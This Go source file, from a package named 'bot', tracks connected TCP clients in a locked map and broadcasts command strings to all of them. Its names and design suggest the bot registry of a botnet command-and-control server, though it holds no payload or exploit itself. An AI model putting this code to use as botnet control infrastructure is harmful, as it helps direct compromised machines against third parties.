package bot

import (
	"bufio"
	"net"
	"sync"
)

type Bot struct {
	Addr string
	Conn net.Conn
}

var (
	Bots  = make(map[string]Bot)
	BotMu sync.RWMutex
)

func GetBots() int {
	BotMu.RLock()
	defer BotMu.RUnlock()
	return len(Bots)
}

func BotHandler(Connection net.Conn) {
	defer Connection.Close()

	Addr := Connection.RemoteAddr().String()

	BotMu.Lock()
	if _, exists := Bots[Addr]; exists {
		BotMu.Unlock()
		return
	}
	Bots[Addr] = Bot{Addr: Addr, Conn: Connection}
	BotMu.Unlock()

	Buffer := make([]byte, 1)
	for {
		_, err := Connection.Read(Buffer)
		if err != nil {
			RemoveBot(Addr)
			return
		}
	}
}

func SendCommandToBots(Command string) {

	BotMu.RLock()
	BotsCopy := make([]Bot, 0, len(Bots))
	for _, Bot := range Bots {
		BotsCopy = append(BotsCopy, Bot)
	}
	BotMu.RUnlock()

	for _, Bot := range BotsCopy {
		Writer := bufio.NewWriter(Bot.Conn)
		Writer.WriteString(Command + "\n")
		Writer.Flush()
	}
}

func RemoveBot(Address string) {
	BotMu.Lock()
	delete(Bots, Address)
	BotMu.Unlock()
}
